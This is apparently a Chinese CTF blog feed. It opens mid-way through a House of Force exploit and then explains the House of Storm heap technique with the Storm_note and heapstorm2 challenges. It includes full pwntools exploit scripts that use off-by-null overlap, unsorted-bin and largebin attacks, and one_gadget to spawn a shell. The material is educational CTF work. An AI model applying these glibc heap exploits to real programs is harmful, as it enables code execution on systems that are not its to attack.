class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>free_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>heap_array <span class="token operator">=</span> <span class="token number">0x0804B120</span> def <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token function">sla</span><span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>   <span class="token function">sla</span><span class="token punctuation">(</span><span class="token string">'note content:'</span><span class="token punctuation">,</span><span class="token function">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token function">sa</span><span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span> def <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token function">sla</span><span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>   <span class="token function">sla</span><span class="token punctuation">(</span><span class="token string">'id:'</span><span class="token punctuation">,</span><span class="token function">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token function">sa</span><span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span> def <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token function">sla</span><span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>   <span class="token function">sla</span><span class="token punctuation">(</span><span class="token string">'id:'</span><span class="token punctuation">,</span><span class="token function">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>def <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token function">sa</span><span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">64</span><span class="token punctuation">)</span>    <span class="token function">ru</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">64</span><span class="token punctuation">)</span>    heap_addr <span class="token operator">=</span> <span class="token function">u32</span><span class="token punctuation">(</span><span class="token function">r</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token function">lg</span><span class="token punctuation">(</span><span class="token string">'heap_addr'</span><span class="token punctuation">,</span>heap_addr<span class="token punctuation">)</span>    <span class="token macro property">#dbg()</span>    <span class="token function">sa</span><span class="token punctuation">(</span><span class="token string">'Org:'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>    #修改top chunk的size为<span class="token operator">-</span><span class="token number">1</span>（<span class="token number">0xFFFFFFFF</span>）    <span class="token function">sla</span><span class="token punctuation">(</span><span class="token string">'Host:'</span><span class="token punctuation">,</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    top_chunk_addr <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0x48</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">0x8</span>    <span class="token function">lg</span><span class="token punctuation">(</span><span class="token string">'top_chunk_addr'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>top_chunk_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    offset <span class="token operator">=</span> heap_array <span class="token operator">-</span> <span class="token punctuation">(</span>top_chunk_addr <span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">-</span> <span class="token number">0x8</span>    <span class="token function">lg</span><span class="token punctuation">(</span><span class="token string">'offset'</span><span class="token punctuation">,</span>offset<span class="token punctuation">)</span>    <span class="token function">add</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span> #<span class="token number">0</span>    <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'\n'</span><span class="token punctuation">)</span> #<span class="token number">1</span>    <span class="token function">edit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p32</span><span class="token punctuation">(</span>free_got<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p32</span><span class="token punctuation">(</span>__libc_start_main_got<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p32</span><span class="token punctuation">(</span>heap_array <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token operator">+</span> b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token function">edit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">p32</span><span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'\n'</span><span class="token punctuation">)</span>    #泄露__libc_start_main_got的地址    <span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token function">r</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    __libc_start_main_addr <span class="token operator">=</span> <span class="token function">u32</span><span class="token punctuation">(</span><span class="token function">r</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">lg</span><span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span>__libc_start_main_addr<span class="token punctuation">)</span>    <span class="token macro property">#dbg()</span>    <span class="token string">''</span>'    libc <span class="token operator">=</span> <span class="token function">LibcSearcher</span><span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span>__libc_start_main_addr<span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> __libc_start_main_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span><span class="token function">dump</span><span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>    system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span><span class="token function">dump</span><span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>    <span class="token function">lg</span><span class="token punctuation">(</span><span class="token string">'libc_base'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">lg</span><span class="token punctuation">(</span><span class="token string">'system_addr'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">edit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">p32</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token string">''</span>'    #本地    one_gadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x3ac3c</span><span class="token punctuation">,</span><span class="token number">0x3ac3e</span><span class="token punctuation">,</span><span class="token number">0x3ac42</span><span class="token punctuation">,</span><span class="token number">0x3ac49</span><span class="token punctuation">,</span><span class="token number">0x5faa5</span><span class="token punctuation">,</span><span class="token number">0x5faa6</span><span class="token punctuation">]</span>    libc <span class="token operator">=</span> <span class="token function">ELF</span><span class="token punctuation">(</span><span class="token string">'/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so'</span><span class="token punctuation">)</span>    <span class="token macro property">#buu远程</span>    <span class="token macro property">#one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]</span>    <span class="token macro property">#libc = ELF('../../libc-2.23.so--32')</span>    libc_base <span class="token operator">=</span> __libc_start_main_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>    onegadget <span class="token operator">=</span> one_gadget<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base    <span class="token function">edit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">p32</span><span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token macro property">#getshell</span>    <span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">itr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;House-Of-Force2&quot;&gt;&lt;a href=&quot;#House-Of-Force2&quot; class=&quot;headerlink&quot; title=&quot;House Of Force2&quot;&gt;&lt;/a&gt;House Of Force2&lt;/h1&gt;&lt;p&gt;基于top chunk分配机制的利用</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Storm</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Storm/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Storm/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:41.819Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-storm"><a href="#House-of-storm" class="headerlink" title="House of storm"></a>House of storm</h1><p>结合了unsorted_bin_attack和Largebin_attack的攻击技术,实现任意地址分配chunk，任意地址写。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件:"></a>利用条件:</h2><pre><code>1.需要攻击者在largebin和unsorted_bin中分别布置一个chunk ，  这两个chunk需要在归位之后处于同一个largebin的index中，  且unsortedbin中的chunk要比largebin中的大2.需要unsorted_bin中的bk指针可控3.需要largebin中的bk指针和bk_nextsize指针可控4.glibc版本小于2.30,因为2.30之后加入了检查</code></pre><h3 id="largebin中size与index的对应关系"><a href="#largebin中size与index的对应关系" class="headerlink" title="largebin中size与index的对应关系"></a>largebin中size与index的对应关系</h3><pre><code>size    index[0x400 , 0x440)    64[0x440 , 0x480)     65[0x480 , 0x4C0)    66[0x4C0 , 0x500)    67[0x500 , 0x540)    68等差 0x40    …[0xC00 , 0xC40)     96[0xC40 , 0xE00)      97[0xE00 , 0x1000)     98[0x1000 , 0x1200)    99[0x1200 , 0x1400)    100[0x1400 , 0x1600)    101等差 0x200    …[0x2800 , 0x2A00)    111[0x2A00 , 0x3000)    112[0x3000 , 0x4000)    113[0x4000 , 0x5000)    114等差 0x1000    …[0x9000 , 0xA000)      119[0xA000 , 0x10000)     120[0x10000 , 0x18000)    121[0x18000 , 0x20000)    122[0x20000 , 0x28000)    123[0x28000 , 0x40000)    124[0x40000 , 0x80000)    125[0x80000 , …. )        126</code></pre><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><pre><code>1.将unsorted_bin中的bk指针改为fake_chunk2.largebin中的bk指针改为fake_chunk+8，bk_nextsize指针改为fake_chunk-0x18-5,（target为要修改的目标地址，fake_chunk为target-0x20） 来满足victim-&gt;bk_nextsize-&gt;fd_nextsize = victim（即fake_chunk-0x18-5=victim）3.再次malloc获得target地址处的chunk，可修改target地址处的值</code></pre><p>House_of_storm的精髓所在——伪造size，如果在程序开启PIE的情况下，堆地址的开头通常是0x55或者0x56开头，且我们的堆地址永远都是6个字节，且如果是小端存储的话，减去五个字节，剩下的就是0x55了。如果提前5个字节开始写堆地址，那么伪造在size字段上面的就正好是0x55。如果后续再申请堆块时，通过对齐使0x55对齐之后和攻击者申请的size正好相同的话，就可以在任意地址上申请出来一个chunk，也就可以达成后续的任意地址写操作。<br>之所以是0x56是因为__int_malloc在拿到chunk后返回到__libc_malloc，__libc_malloc会对chunk的进行检查，这里如果有错的话会直接crash，必须满足以下条件之一即可：</p><pre><code>1. victim 为 02. IS_MMAPPED 为 13. NON_MAIN_ARENA 为 0</code></pre><p>0x56（二进制数为0101 0110）满足条件<br>0x55（二进制数为0101 0101）不满足条件<br>但是由于程序有随机化，多运行几次总能有一次成功的。</p><pre><code>unsorted_bin-&gt;fd = 0unsorted_bin-&gt;bk = fake_chunklarge_bin-&gt;fd = 0large_bin-&gt;bk = fake_chunk+8large_bin-&gt;fd_nextsize = 0large_bin-&gt;bk_nextsize = fake_chunk - 0x18 -5</code></pre><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="2019-西湖论剑-Storm-note"><a href="#2019-西湖论剑-Storm-note" class="headerlink" title="2019 西湖论剑 Storm_note"></a>2019 西湖论剑 Storm_note<img src="https://img-blog.csdnimg.cn/7c6fe5147ccf463e93da3ca872c3ad58.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></h3><p>保护全开，实现四个功能，增改删退，ida查看伪代码<br>init_proc()函数，mallopt()函数，设置fastbin 范围最大为0，禁用了fastbin，<br>之后用mmap在 0xABCD0100处分配0x30大小的空间，填充上了随机数</p><h4 id="init-proc-函数"><a href="#init-proc-函数" class="headerlink" title="init_proc()函数"></a>init_proc()函数</h4><pre><code> ssize_t init_proc(){  ssize_t result; // rax  int fd; // [rsp+Ch] [rbp-4h]  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  if ( !mallopt(1, 0) )                         // mallopt(M_MXFAST,0)将global_max_fast设置为0,                                                // 这个值的意思是最大为多大的chunk归fastbin管理,                                                // 设置为0表示这个程序中不再存在fastbin。                                                // 即本程序禁用了fastbin。    exit(-1);  if ( mmap(0xABCD0000LL, 0x1000uLL, 3, 34, -1, 0LL) != 0xABCD0000LL )    exit(-1);  fd = open("/dev/urandom", 0);  if ( fd &lt; 0 )    exit(-1);  result = read(fd, 0xABCD0100LL, 0x30uLL);  if ( result != 48 )    exit(-1);  return result;}</code></pre><h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><p>calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。</p><pre><code>unsigned __int64 alloc_note(){  int size; // [rsp+0h] [rbp-10h] BYREF  int i; // [rsp+4h] [rbp-Ch]  unsigned __int64 v3; // [rsp+8h] [rbp-8h]  v3 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 15 &amp;&amp; note[i]; ++i )    ;  if ( i == 16 )  {    puts("full!");  }  else  {    puts("size ?");    _isoc99_scanf("%d", &amp;size);    if ( size &gt; 0 &amp;&amp; size &lt;= 0xFFFFF )    {      note[i] = calloc(size, 1uLL);             // calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。                                                //       note_size[i] = size;      puts("Done");    }    else    {      puts("Invalid size");    }  }  return __readfsqword(0x28u) ^ v3;}</code></pre><h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4><p>存在off-by-null</p><pre><code>unsigned __int64 edit_note(){  unsigned int size; // [rsp+0h] [rbp-10h] BYREF  int v2; // [rsp+4h] [rbp-Ch]  unsigned __int64 v3; // [rsp+8h] [rbp-8h]  v3 = __readfsqword(0x28u);  puts("Index ?");  _isoc99_scanf("%d", &amp;size);  if ( size &lt;= 0xF &amp;&amp; note[size] )  {    puts("Content: ");    v2 = read(0, note[size], note_size[size]);    *(note[size] + v2) = 0;                     // off-by-null                                                //     puts("Done");  }  else  {    puts("Invalid index");  }  return __readfsqword(0x28u) ^ v3;}</code></pre><h4 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><p>无uaf</p><pre><code>unsigned __int64 delete_note(){  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts("Index ?");  _isoc99_scanf("%d", &amp;v1);  if ( v1 &lt;= 0xF &amp;&amp; note[v1] )  {    free(note[v1]);    note[v1] = 0LL;    note_size[v1] = 0;  }  else  {    puts("Invalid index");  }  return __readfsqword(0x28u) ^ v2;}</code></pre><h4 id="一个后门函数"><a href="#一个后门函数" class="headerlink" title="一个后门函数"></a>一个后门函数</h4><p>要想执行system(“/bin/sh”);，需要输入与程序一开始分配的随机数相同的数</p><pre><code>void __noreturn backdoor(){  char buf[56]; // [rsp+0h] [rbp-40h] BYREF  unsigned __int64 v1; // [rsp+38h] [rbp-8h]  v1 = __readfsqword(0x28u);  puts("If you can open the lock, I will let you in");  read(0, buf, 0x30uLL);  if ( !memcmp(buf, 0xABCD0100LL, 0x30uLL) )    system("/bin/sh");  exit(0);}</code></pre><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>1、利用off-by-null 漏洞构造堆风水，实现堆块重叠，从而控制堆块内容。<br>2、House of storm，将处于unsortedbin的可控制的chunk放入largebin中，以便触发largebin attack<br>3、控制largebin的bk和bk_nextsize指针，通过malloc触发漏洞，分配到目标地址，实现任意地址写，将0xABCD0100处的0x30字节改为已知值，获得shell</p><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>先把前面的东西写好</p><pre><code># coding=utf-8from pwn import *#context(endian='little',os='linux',arch='amd64',log_level='debug')sh = process('./Storm_note')s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims    :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\0'))uu64    = lambda data               :u64(data.ljust(8,'\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))def dbg():        gdb.attach(sh)        pause()def add(size):  sla('Choice','1')  sla('?',str(size))def edit(index,text):  sla('Choice','2')  sla('?',str(index))  sa('Content',text)def free(index):  sla('Choice','3')  sla('?',str(index))</code></pre><p>首先申请两组chunk，用来构造堆块重叠，并进入unsortedbin和largebin</p><pre><code>add(0x18)#0add(0x508)#1add(0x18)#2add(0x18)#3add(0x508)#4add(0x18)#5add(0x18)#6dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/321b4d41c3014c2b879d9f599177de23.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/321b4d41c3014c2b879d9f599177de23.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p><p>然后构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。</p><pre><code>edit(1,'a'*0x4f0+p64(0x500)) edit(4,'a'*0x4f0+p64(0x500)) dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/e61a65c715fa4284ac55a3b9905d09f6.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/e61a65c715fa4284ac55a3b9905d09f6.png?ynotemdtimestamp=1663776442613" alt="img"><br>然后再free(1)，利用off-by-null编辑chunk_0，将chunk_1的size从0x510改为0x500，由于刚才构造的两个fake chunk，此时堆块已合并</p><pre><code>free(1)edit(0,'a'*0x18)#off-by-null改写chunk1的size为0x500dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/9ec5985989204608aa56aafec155f7b5.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/9ec5985989204608aa56aafec155f7b5.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>再申请两个chunk，使之恢复正常，之后free掉chunk_1和chunk_2，使之合并</p><pre><code>add(0x18)#1add(0x4d8)#7  free(1)free(2)    dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/4e4ed9a1288a49189cef06355829b08d.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/4e4ed9a1288a49189cef06355829b08d.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>再次申请两个特定大小的chunk即可实现chunk7可以控制原unsortedbin chunk 0x4f1的bk指针，即我们可以用chunk_7来控制chunk_2(unsortedbin chunk),为便于理解我们可查看一下note这个存放全局chunk mem指针的数组</p><pre><code>add(0x30)#1 此时chunk1可以控制原unsortedbin chunk  0x4f1(chunk_2)的bk指针add(0x4e0)#2dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/36e2df6f2de145d9927fe1d89316d64e.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/36e2df6f2de145d9927fe1d89316d64e.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针</p><pre><code>free(4)edit(3,'a'*0x18)#off by nulladd(0x18)#4add(0x4d8)#8 0x5a0free(4)free(5)add(0x40)#4 0x580</code></pre><p>之后free(2)，放入unsortedbin</p><pre><code>free(2)    dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/77c5a9870baa4026bff5f9628c03ba04.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/77c5a9870baa4026bff5f9628c03ba04.png?ynotemdtimestamp=1663776442613" alt="img"><br>再申请回来0x4e8（0x4f0）大小的chunk，使0x4e0大小的chunk进入largebin</p><pre><code>add(0x4e8)      # put chunk8(0x5c0) to largebindbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/a37cfa88b26d4999b0b0317fc9d111fa.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/a37cfa88b26d4999b0b0317fc9d111fa.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>再次free(2)，构造一个unsortedbin chunk和一个largebin chunk</p><pre><code>free(2) #put chunk2 to unsortedbindbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/c0e50b9fc3c149718a85e6b75b358153.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/c0e50b9fc3c149718a85e6b75b358153.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后利用刚才构造的堆块重叠，修改unsortedbin chunk的bk指针为目标地址（target-0x20）</p><pre><code>target = 0xabcd0100fake_chunk = target - 0x20payload = p64(0)*2 + p64(0) + p64(0x4f1) # sizepayload += p64(0) + p64(fake_chunk)      # bkedit(7,payload)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/7bbc8214b1b0476398f502ea56f09b2c.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/7bbc8214b1b0476398f502ea56f09b2c.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/04851cb22b004a94ba30521980d47ec0.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/04851cb22b004a94ba30521980d47ec0.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后利用刚才构造的堆块重叠，修改largebin chunk的bk指针和bk_nextsize指针分别为fake_chunk+8，和fake_chunk-0x18-5</p><pre><code>payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #sizepayload2 += p64(0) + p64(fake_chunk+8)   payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmapedit(8,payload2)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/069a9ee48f35474e9a26769b36036e38.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/069a9ee48f35474e9a26769b36036e38.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/f419df60e7804ce282eda0636ae98979.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/f419df60e7804ce282eda0636ae98979.png?ynotemdtimestamp=1663776442613" alt="img"><br>然后申请0x40（0x50）大小的chunk，可以看到在目标地址处0xabcd00e0成功伪造fake chunk，size为0x56，巧妙的实现victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</p><pre><code>add(0x40)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/950899dc8f374c7387c8f6923d8d813d.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/950899dc8f374c7387c8f6923d8d813d.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后就是把0xABCD0100处的0x30个字节改为已知数，然后获得shell</p><pre><code>payload = '\x00'*(0x10+0x30)edit(2,payload)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/65914edb5d2a4b28818664c8e045bbb9.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/65914edb5d2a4b28818664c8e045bbb9.png?ynotemdtimestamp=1663776442613" alt="img"></p><pre><code>    sla('Choice: ','666')    s(p64(0)*6)    itr()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/c88e75a6f70c4602a715c19022ed53fd.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/c88e75a6f70c4602a715c19022ed53fd.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code># coding=utf-8from pwn import *#context(endian='little',os='linux',arch='amd64',log_level='debug')sh = process('./Storm_note')s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims    :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\0'))uu64    = lambda data               :u64(data.ljust(8,'\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))def dbg():        gdb.attach(sh)        pause()def add(size):  sla('Choice','1')  sla('?',str(size))def edit(index,text):  sla('Choice','2')  sla('?',str(index))  sa('Content',text)def free(index):  sla('Choice','3')  sla('?',str(index))#---------------布置chunk-------------------------#add(0x18)#0add(0x508)#1add(0x18)#2add(0x18)#3add(0x508)#4add(0x18)#5add(0x18)#6#dbg()#构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。edit(1,'a'*0x4f0+p64(0x500)) edit(4,'a'*0x4f0+p64(0x500)) #dbg()#----------------准备 unsorted chunk-----------------------#free(1)edit(0,'a'*0x18)#off-by-null改写chunk1的size为0x500#dbg()add(0x18)#1add(0x4d8)#7  free(1)free(2)    #dbg()#recoveradd(0x30)#1 此时chunk7可以控制原 （unsortedbin chunk  0x4f1）的bk指针add(0x4e0)#2#-------------------准备 large chunk-----------------------------------##dbg()#下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针free(4)edit(3,'a'*0x18)#off by nulladd(0x18)#4add(0x4d8)#8 0x5a0free(4)free(5)add(0x40)#4 0x580 #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#free(2)    #unsortedbin-&gt; chunk2 -&gt; chunk5(chunk8)(0x5c0)    which size is largebin FIFO #dbg()#add(0x4e8)      # put chunk8(0x5c0) to largebin#dbg()free(2) #put chunk2 to unsortedbin#dbg() #--------------修改他们是的满足条件进行 house of strom------------------------------#target = 0xabcd0100fake_chunk = target - 0x20payload = p64(0)*2 + p64(0) + p64(0x4f1) # sizepayload += p64(0) + p64(fake_chunk)      # bkedit(7,payload)#dbg()payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #sizepayload2 += p64(0) + p64(fake_chunk+8)   payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmapedit(8,payload2)#dbg()add(0x40)#dbg()payload = '\x00'*(0x10+0x30)edit(2,payload)#dbg()sla('Choice: ','666')s(p64(0)*6)itr()</code></pre><h3 id="0ctf-2018-heapstorm2"><a href="#0ctf-2018-heapstorm2" class="headerlink" title="0ctf_2018_heapstorm2"></a>0ctf_2018_heapstorm2</h3><p class='item-img' data-src='https://img-blog.csdnimg.cn/13f92447a47b42a68e668fd3bb4f835f.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/13f92447a47b42a68e668fd3bb4f835f.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>同样是保护全开，</p><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>实现四个功能，增删改查</p><pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3){  __int64 v4; // [rsp+8h] [rbp-8h]   //v4=0x13370800  v4 = sub_BE6();  while ( 1 )  {    menu();    switch ( chioce(a1, a2) )    {      case 1LL:        a1 = v4;        add(v4);        break;      case 2LL:        a1 = v4;        up(v4);        break;      case 3LL:        a1 = v4;        delete(v4);        break;      case 4LL:        a1 = v4;        show(v4);        break;      case 5LL:        return 0LL;      default:        continue;    }  